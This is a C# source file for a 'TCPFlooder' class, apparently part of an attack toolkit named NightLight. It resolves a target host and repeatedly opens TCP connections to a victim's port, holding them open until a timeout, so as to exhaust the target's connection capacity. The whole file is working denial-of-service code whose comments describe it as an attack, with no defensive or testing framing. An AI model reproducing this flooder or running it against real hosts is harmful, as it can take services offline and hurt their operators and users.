using System;
using System.Collections;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace NightLight.TCP
{
    class TCPFlooder : ITool
    {
        /// <summary>
        /// Holds information about who we shall connect to
        /// </summary>
        private IPAddress[] target;

        /// <summary>
        /// The victims port
        /// </summary>
        private int port;

        /// <summary>
        /// Keeps track of when we started the attack
        /// </summary>
        private DateTime executionStart;

        /// <summary>
        /// Holds the amount of ms the flood can stay
        /// </summary>
        private int timeOut;

        /// <summary>
        /// Amount of connections that shall be made in the start
        /// </summary>
        private int maxConnections;

        /// <summary>
        /// Holds a boolean on wether the tool has stopped or not
        /// </summary>
        private bool hasStopped;

        /// <summary>
        /// Stores all the connections so we can close them when the tool is terminated
        /// </summary>
        private Queue connections;

        /// <summary>
        /// Returns how many ms the attack has been running
        /// </summary>
        private int ExecutionTime
        {
            get
            {
                return (int)(DateTime.Now - executionStart).TotalMilliseconds;
            }
        }

        /// <summary>
        /// Returns a boolean on wether the tool has been running over the total life-time (RIP :()
        /// </summary>
        public bool IsTimedOut
        {
            get
            {
                return ExecutionTime > timeOut;
            }
        }

        /// <summary>
        /// Constructs the TCPFlooder object
        /// </summary>
        public TCPFlooder()
        {
            this.hasStopped = false;
        }

        /// <summary>
        /// Initializes the settings
        /// </summary>
        /// <param name="target">Targets IP</param>
        /// <param name="port">Targets port</param>
        /// <param name="maxConnections">Maximum connections</param>
        /// <param name="timeout">Max time for the tool to live</param>
        public void Init(string target, int port, int maxConnections, int timeout)
        {
            IPHostEntry entry = Dns.GetHostEntry(target);
            this.target = entry.AddressList;
            this.port = port;
            this.maxConnections = maxConnections;
            this.timeOut = timeout;
            this.connections = new Queue(maxConnections);
        }

        /// <summary>
        /// Starts the attack by creating the connections. The connections are handed to the thread pool so no new threads are needed
        /// </summary>
        public void Start()
        {
            this.executionStart = DateTime.Now;
            for (int i = 0; i < maxConnections; i++)
            {
                CreateNewConnection();   
            }
        }

        /// <summary>
        /// Creates a new connection
        /// </summary>
        private void CreateNewConnection()
        {
            if (hasStopped)
                return;
            try
            {
                Socket connection = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                connection.BeginConnect(target, port, ConnectionCreated, connection);
            }
            catch
            { }
        }

        /// <summary>
        /// Callback when the connection has connected to the target
        /// </summary>
        /// <param name="iar">The iar object which contains socket spesific data</param>
        private void ConnectionCreated(IAsyncResult iar)
        {
            lock (connections.SyncRoot)
            {
                connections.Enqueue(iar.AsyncState);
            }
            CreateNewConnection();
        }

        /// <summary>
        /// Aborts the operation
        /// </summary>
        public void Abort()
        {
            hasStopped = true;
            lock (connections.SyncRoot)
            {
                while (connections.Count > 0)
                {
                    Socket connection = (Socket)connections.Dequeue();
                    try
                    {
                        connection.Close();
                    }
                    catch { }
                }
            }
        }

        /// <summary>
        /// Returns a status of the tool
        /// </summary>
        /// <returns>Status message</returns>
        public string GetStatus()
        {
            StringBuilder status = new StringBuilder();
            status.AppendLine(string.Format("Connections total: {0}", connections.Count));
            status.AppendLine(string.Format("Total runtime: {0} ms", ExecutionTime));

            return status.ToString();
        }
    }
}
